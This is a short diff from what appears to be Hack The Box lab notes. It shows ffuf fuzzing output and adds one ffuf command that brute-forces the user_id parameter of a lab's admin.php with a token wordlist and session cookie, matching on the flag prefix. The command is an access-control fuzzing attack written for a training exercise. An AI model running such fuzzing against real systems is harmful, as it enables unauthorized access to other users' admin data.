@@ -52,3 +52,7 @@ Manchester              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 265
 Manchester              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 262ms]
 [WARN] Caught keyboard interrupt (Ctrl-C)
 
+
+
+
+ffuf -w ./tokens.txt -u "http://94.237.59.174:47956/admin.php?user_id=FUZZ" -b "PHPSESSID=ok1fgb4aiogub5e7enbflme2lv" -fr "Could not load admin data. Please check your privileges" -mr "HTB{"
